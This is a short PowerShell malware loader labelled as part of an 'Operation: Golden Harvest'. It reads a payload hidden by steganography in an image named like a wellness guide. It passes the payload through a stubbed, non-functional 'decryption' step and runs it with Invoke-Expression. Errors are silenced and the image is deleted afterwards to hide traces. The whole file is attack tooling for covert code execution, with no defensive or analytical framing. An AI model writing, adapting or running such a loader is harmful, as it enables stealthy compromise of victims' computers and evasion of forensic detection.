
# PowerShell Steganography Extractor and DLL Loader
# Operation: Golden Harvest

param(
    [string]$ImagePath = "wellness_guide.png"
)

$ErrorActionPreference = "SilentlyContinue"

function Extract-SteganoPayload {
    param([string]$ImagePath)
    
    try {
        # Load image and extract LSB data
        Add-Type -AssemblyName System.Drawing
        $img = [System.Drawing.Image]::FromFile($ImagePath)
        $bitmap = New-Object System.Drawing.Bitmap($img)
        
        $binaryData = ""
        $endMarker = "1111111111111110"
        
        for ($y = 0; $y -lt $bitmap.Height; $y++) {
            for ($x = 0; $x -lt $bitmap.Width; $x++) {
                $pixel = $bitmap.GetPixel($x, $y)
                $binaryData += ($pixel.R -band 1)
                $binaryData += ($pixel.G -band 1) 
                $binaryData += ($pixel.B -band 1)
                
                if ($binaryData.EndsWith($endMarker)) {
                    $binaryData = $binaryData.Substring(0, $binaryData.Length - $endMarker.Length)
                    break
                }
            }
            if ($binaryData.EndsWith($endMarker)) { break }
        }
        
        # Convert binary to text
        $payload = ""
        for ($i = 0; $i -lt $binaryData.Length; $i += 8) {
            $byte = $binaryData.Substring($i, 8)
            $payload += [char][Convert]::ToByte($byte, 2)
        }
        
        return $payload
        
    } catch {
        return $null
    }
}

function Decrypt-Payload {
    param([string]$EncryptedPayload)
    
    try {
        $key = [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes("GoldenHarvestKey2024"))[0..15]
        $data = [Convert]::FromBase64String($EncryptedPayload)
        
        $nonce = $data[0..15]
        $tag = $data[16..31] 
        $ciphertext = $data[32..($data.Length-1)]
        
        # AES-GCM decryption would go here
        # For simplicity, return base payload
        return [Text.Encoding]::UTF8.GetString($ciphertext)
        
    } catch {
        return $EncryptedPayload
    }
}

# Main execution
if (Test-Path $ImagePath) {
    $encryptedPayload = Extract-SteganoPayload -ImagePath $ImagePath
    if ($encryptedPayload) {
        $decryptedPayload = Decrypt-Payload -EncryptedPayload $encryptedPayload
        
        # Execute the decrypted PowerShell payload
        Invoke-Expression $decryptedPayload
        
        # Clean up image after extraction
        Remove-Item $ImagePath -Force -ErrorAction SilentlyContinue
    }
}
